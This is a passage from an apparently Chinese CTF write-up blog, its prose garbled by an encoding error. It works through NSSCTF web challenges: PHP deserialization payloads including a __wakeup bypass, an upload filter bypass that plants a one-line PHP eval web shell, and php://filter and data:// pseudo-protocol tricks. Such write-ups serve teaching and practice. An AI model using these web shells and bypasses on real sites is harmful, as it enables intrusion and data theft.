</span><br><span class="line">[<span class="number">12</span>:<span class="number">18</span>:<span class="number">55</span>] <span class="number">403</span> <span class="operator">-</span>  <span class="number">311</span>B  <span class="operator">-</span> <span class="symbol">/server-status</span>                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p><code>flag.php</code>ä¸­æ²¡æœ‰ä¸œè¥¿ï¼Œå»robots.txtä¸­çœ‹çœ‹ï¼Œå‘ç°åˆç»™äº†ä¸€ä¸ªæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl http://node4.anna.nssctf.cn:28921/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /cl45s.php</span><br></pre></td></tr></table></figure></div>
<p>è®¿é—®å¾—åˆ°æºç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>è€ƒæŸ¥çš„æ˜¯phpååºåˆ—åŒ–ï¼Œè¿™é‡Œé€šè¿‡GETè¯·æ±‚æ¥å—på‚æ•°ï¼Œç„¶åå°†pååºåˆ—åŒ–<br><code>åºåˆ—åŒ–ï¼šåœ¨phpåœ¨å¯¹è±¡æ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œåœ¨ä¸ºå¯¹è±¡èµ‹å€¼åï¼Œä¸ºäº†å°†æ•°æ®å®Œæ•´çš„ä¿å­˜èµ·æ¥ï¼Œphpæä¾›äº†ä¸€ä¸ªå‡½æ•°serializeï¼ˆï¼‰ ï¼Œä»–ä¼šå°†å¯¹è±¡å˜æˆä¸€ç§ç‰¹æ®Šçš„å­—ç¬¦ä¸²</code><br>æ ¹æ®ä»£ç ï¼Œæˆ‘ä»¬å°±æ˜¯è¦è®©$this-&gt;admin &#x3D;&#x3D;&#x3D; â€œadminâ€ &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D; â€œctfâ€<br>æœ¬åœ°åˆ›å»ºphpä»£ç ,ç„¶åå¾—åˆ°æŒ‰ç…§è¦æ±‚å¾—å‡ºä¸€ä¸ªç¬¦åˆè¦æ±‚çš„åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²ï¼Œç„¶åç”¨på‚æ•°ä¼ å…¥ï¼Œè®©ä»–ååºåˆ—åŒ–</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wllm</span>();  <span class="comment">//åˆ›å»ºä¸€ä¸ªwllmç±»</span></span><br><span class="line"><span class="comment">//ä¿®æ”¹adminå’Œpasswdå‚æ•°</span></span><br><span class="line"><span class="variable">$a</span> -&gt; admin = <span class="string">&quot;admin&quot;</span>;  </span><br><span class="line"><span class="variable">$a</span> -&gt; passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ctf&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?p</span>=<span class="symbol">O:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;wllm&quot;</span></span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;passwd&quot;</span></span>;<span class="symbol">s:</span><span class="number">3</span><span class="symbol">:<span class="string">&quot;ctf&quot;</span></span>;&#125;</span><br><span class="line"><span class="variable constant_">NSSCTF</span>&#123;53d996d2-26ff-<span class="number">4708</span>-b963-b1021be87229&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h1><p><img src="https://pic1.imgdb.cn/item/67af1312d0e0a243d4ff2fff.png"><br>å¦‚æœæˆ‘éšä¾¿ä¸Šä¼ ä¸€å¼ ç…§ç‰‡ä¼šæ˜¾ç¤ºå›¾ç‰‡å¤ªå¤§<br>å¦‚æœæˆ‘ç›´æ¥ä¸Šä¼ ä¸€ä¸ªphpåˆä¼šæç¤º<code>æƒ³å•¥å‘¢</code><br>ä½†æ˜¯è¿™é‡Œåªæ˜¯åœ¨å‰ç«¯åšäº†éªŒè¯ï¼Œæˆ‘æŠŠè¿™ä¸ªphpæ–‡ä»¶åç¼€æ”¹æˆ.jpgå°±æˆåŠŸä¸Šä¼ äº†<br>phpä¸­æ˜¯ä¸€å¥è¯æœ¨é©¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./upload/<span class="number">1</span>.jpg succesfully uploaded!</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯è¿™æ ·è¿˜ä¸èƒ½ç›´æ¥åˆ©ç”¨ï¼Œå› ä¸ºæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬æ˜¯phpæ–‡ä»¶ï¼Œéœ€è¦ç”¨bpæŠ“åŒ…ç„¶åæ”¹åç¼€å<br><img src="https://pic1.imgdb.cn/item/67af15a9d0e0a243d4ff310b.png"><br>åªè¦æ”¹åç¼€åï¼ŒContent-Typeä¸è¦æ”¹<br><img src="https://pic1.imgdb.cn/item/67af1644d0e0a243d4ff3230.png"><br>ä½†æ˜¯åœ¨èšå‰‘ä¸­æ‰¾åˆ°çš„flag.phpä¸­çš„flagä¸æ˜¯çœŸçš„flagï¼ˆæ ¼å¼ä¸å¯¹<br>æ‰€ä»¥æˆ‘ä»¬åœ¨èšå‰‘çš„ç»ˆç«¯ä¸­è¾“å…¥<code>php -i</code>æ˜¾ç¤ºphpçš„ä¿¡æ¯(æ•ˆæœå’Œphpinfo()ä¸€æ ·)<br>åœ¨environmentä¸­æ‰¾åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">Environment</span><br><span class="line"><span class="keyword">Variable</span> =&gt; Value</span><br><span class="line">PHP_UPLOAD_MAX_FILESIZE <span class="comment">=&gt; 10M</span></span><br><span class="line">SUPERVISOR_GROUP_NAME <span class="comment">=&gt; apache2</span></span><br><span class="line">HOSTNAME <span class="comment">=&gt; 508d19edf32d40f8</span></span><br><span class="line">SHLVL <span class="comment">=&gt; 0</span></span><br><span class="line">OLDPWD <span class="comment">=&gt;</span> /app/<span class="comment">upload</span></span><br><span class="line">APACHE_RUN_DIR <span class="comment">=&gt;</span> /var/<span class="comment">run</span>/apache2</span><br><span class="line">APACHE_PID_FILE =&gt; /<span class="comment">var</span>/run/<span class="comment">apache2</span>/apache2.pid</span><br><span class="line">PHP_POST_MAX_SIZE =&gt; <span class="number">10</span>M</span><br><span class="line">PATH =&gt; /<span class="comment">usr</span>/local/<span class="comment">sbin:</span>/usr/<span class="comment">local</span>/bin:/<span class="comment">usr</span>/sbin:/<span class="comment">usr</span>/bin:/<span class="comment">sbin:</span>/bin:/<span class="comment">usr</span>/local/<span class="comment">sbin:</span>/usr/<span class="comment">local</span>/bin:/<span class="comment">usr</span>/sbin:/<span class="comment">usr</span>/bin:/<span class="comment">sbin:</span>/bin</span><br><span class="line">APACHE_LOCK_DIR =&gt; /<span class="comment">var</span>/lock/<span class="comment">apache2</span></span><br><span class="line">LANG <span class="comment">=&gt; C</span></span><br><span class="line">SUPERVISOR_ENABLED <span class="comment">=&gt; 1</span></span><br><span class="line">DEBIAN_FRONTEND <span class="comment">=&gt; noninteractive</span></span><br><span class="line">APACHE_RUN_USER <span class="comment">=&gt; www-data</span></span><br><span class="line">APACHE_RUN_GROUP <span class="comment">=&gt; www-data</span></span><br><span class="line">APACHE_LOG_DIR <span class="comment">=&gt;</span> /var/<span class="comment">log</span>/apache2</span><br><span class="line">SUPERVISOR_SERVER_URL =&gt; unix:<span class="comment">///var/run/supervisor.sock</span></span><br><span class="line">SUPERVISOR_PROCESS_NAME =&gt; apache2</span><br><span class="line">PWD =&gt; /<span class="comment">var</span>/www/<span class="comment">html</span>/upload</span><br><span class="line">FLAG =&gt; NSSCTF&#123;efc6307a-ada5<span class="number">-4</span>ef6-bd9e<span class="number">-4</span>eb12544051b&#125;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹æäº†ï¼Œç»™äº†ä¸€ä¸ªå‡çš„flagã€‚ã€‚ ä¸»è¦æ˜¯è¦æ‡‚æŠ“åŒ…æ”¹åç¼€ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå¦‚æœä¸ç”¨èšå‰‘ä¹Ÿå¯ä»¥ç”¨hackbarç”¨POSTè¯·æ±‚ä¼ å…¥ï¼Œè®©<code>a = phpinfo();</code>ä¹Ÿå¯ä»¥æ‰¾åˆ°flagï¼Œä¸è¿‡ç¬¬ä¸€æ„Ÿè§‰è¿˜æ˜¯å»èšå‰‘é‡Œé¢çš„ç›®å½•æ‰¾å§</p>
<h1 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h1><p>è¿™é¢˜é¢˜é¢å’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä½†æ˜¯ä»–åœ¨åç«¯åšäº†æ ¡éªŒï¼Œå¦‚æœè¿˜æ˜¯ç”¨bpä¿®æ”¹åç¼€ä¼šæ˜¾ç¤ºphpæ˜¯ä¸è¡Œæ»´<br>è¿™é‡Œè¦äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šphp3ï¼Œphp5ï¼Œphtï¼Œphtmlï¼Œphps éƒ½æ˜¯ php å¯è¿è¡Œçš„æ–‡ä»¶æ‰©å±•å<br>æ‰€ä»¥æˆ‘ä»¬å°è¯•æ”¹æˆå…¶ä»–çš„åç¼€åè¯•è¯•,æˆåŠŸä¸Šä¼ ï¼Œç„¶åå’Œä¸Šé¢˜ä¸€æ ·ç”¨èšå‰‘è¿æ¥æ‰¾åˆ°flag(çœŸflag)<br><img src="https://pic1.imgdb.cn/item/67af1982d0e0a243d4ff34e7.png"></p>
<h1 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd === <span class="string">&quot;wllm&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No wake up&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$Letmeseesee</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å’Œå‰é¢é‚£é¢˜easy serializeä¸€æ ·ï¼Œæœ¬åœ°å†™ä¸ªphpä»£ç ç”Ÿæˆæ»¡è¶³æ¡ä»¶çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ç„¶åç”¨GETä¸Šä¼ <br>ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ª__wakeup()é­”æ³•å‡½æ•°ï¼Œå½“å¯¹è±¡è¢«ååºåˆ—åŒ–æ—¶ï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚<br>è¿™é‡Œçš„$this -&gt; passwdä¼šè¢«sha1åŠ å¯†ã€‚ä½†æ˜¯sha1åŠ å¯†ä¸å¯é€†ï¼Œæˆ‘ä»¬ä¸æƒ³è®©wakeupè¿™ä¸ªå‡½æ•°æ‰§è¡Œã€‚<br><mark>å½“åºåˆ—åŒ–åå¯¹è±¡çš„å‚æ•°åˆ—è¡¨ä¸­æˆå‘˜ä¸ªæ•°å’Œå®é™…ä¸ªæ•°ä¸ç¬¦åˆæ—¶ä¼šç»•è¿‡ __weakup (); </mark><br>åˆ©ç”¨ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;passwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">HaHaHa</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> -&gt; passwd = <span class="string">&quot;wllm&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;HaHaHa&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;wllm&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæˆ‘ä»¬æŠŠå‚æ•°ä¸ªæ•°<code>2</code>æ”¹æˆå’Œå®é™…ä¸ç¬¦ï¼Œæ¯”å¦‚1ï¼Œç”¨GETä¼ å…¥ï¼Œå¾—åˆ°flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line"><span class="string">?p</span>=<span class="symbol">O:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;HaHaHa&quot;</span></span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">5</span><span class="symbol">:<span class="string">&quot;admin&quot;</span></span>;<span class="symbol">s:</span><span class="number">6</span><span class="symbol">:<span class="string">&quot;passwd&quot;</span></span>;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">&quot;wllm&quot;</span></span>;&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h1><p>é¢˜ç›®<br><img src="https://pic1.imgdb.cn/item/67af3304d0e0a243d4ff4430.png"><br>çœ‹åˆ°é¢˜ç›®æˆ‘ä»¬è·å¾—ä¸¤ä¸ªä¿¡æ¯ï¼Œ1. è¦æ‰¾åˆ°hint.php 2.urlé‡Œé¢è‡ªå¸¦äº†?wllm&#x3D;<br>é¢˜ç›®æ˜¯<code>PseudoProtocols</code>(ä¼ªåè®®)ï¼Œæˆ‘ä»¬ç”¨phpä¼ªåè®®è¯»ä¸€ä¸‹hint.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">?wllm=php:<span class="comment">//filter/read=convert.base64-encode/resource=hint.php</span></span><br><span class="line">PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># echo PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4= | base64 -d</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥å»è¯»&#x2F;test2222222222222.php<br><img src="https://pic1.imgdb.cn/item/67af360ad0e0a243d4ff45f0.png"><br>è¿™é‡Œè¦ç”¨getè¯·æ±‚ä¼ å…¥å‚æ•°aï¼Œç„¶ååˆ¤æ–­açš„å€¼æ˜¯ä¸æ˜¯â€I want flagâ€<br>è¿™é‡Œäº†è§£ä¸€ä¸‹ï¼Œ<code>file_get_contents()</code> æ˜¯ PHP è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°ï¼Œdata:&#x2F;&#x2F; ä¼ªåè®®å…è®¸åœ¨ URL ç›´æ¥å­˜å‚¨æ•°æ®ï¼Œè€Œä¸éœ€è¦å®é™…æ–‡ä»¶ï¼Œ<code>php://input</code> æ‰§è¡Œ POST æ•°æ®ä¸­çš„ php ä»£ç ã€‚<br>æ‰€ä»¥è¿™é¢˜åˆ©ç”¨dataä¼ªåè®®æˆ–è€…php:&#x2F;&#x2F;inputå­˜å‚¨æ•°æ®ï¼Œç„¶åç¨‹åºè¯»å–åˆ¤æ–­<br>php:&#x2F;&#x2F;input<br><img src="https://pic1.imgdb.cn/item/67af38c8d0e0a243d4ff47de.png"><br>data:&#x2F;&#x2F;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//n</span>ode7.anna.nssctf.cn:<span class="number">22738</span>//test2222222222222.php?a=data:<span class="regexp">//</span>text/plain,I<span class="variable">%2</span>0want<span class="variable">%20flag</span></span><br></pre></td></tr></table></figure></div>
<h1 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$wllm</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;wllm&#x27;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;\t&#x27;</span>,<span class="string">&#x27;\r&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\=&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$wllm</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);</span><br><span class="line">    &#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="variable">$wllm</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$wllm</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼</span><br></pre></td></tr></table></figure></div>
